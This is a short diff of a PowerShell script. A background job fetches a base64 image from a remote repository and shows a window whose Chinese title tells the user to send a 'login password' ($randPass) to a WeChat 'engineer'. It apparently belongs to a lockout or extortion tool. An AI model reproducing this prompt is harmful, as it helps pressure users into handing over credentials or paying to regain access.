@@ -208,7 +208,7 @@ $job = Start-Job -ScriptBlock {
     $Source = (irm https://cnb.cool/GHFXJ/PS/-/git/raw/main/WX.txt).trim()
     $img = [Drawing.Image]::FromStream([IO.MemoryStream]::new([Convert]::FromBase64String($Source.Trim())))
     #$img = [Drawing.Image]::FromFile("$HOME\desktop\wx3.gif")
-    $Title = "把登陆密码: $randPass 发给下方微信工程师"
+    $Title = "把登陆密码: $($using:randPass) 发给下方微信工程师"
     $TopOffset = 380
 
     # 创建窗体
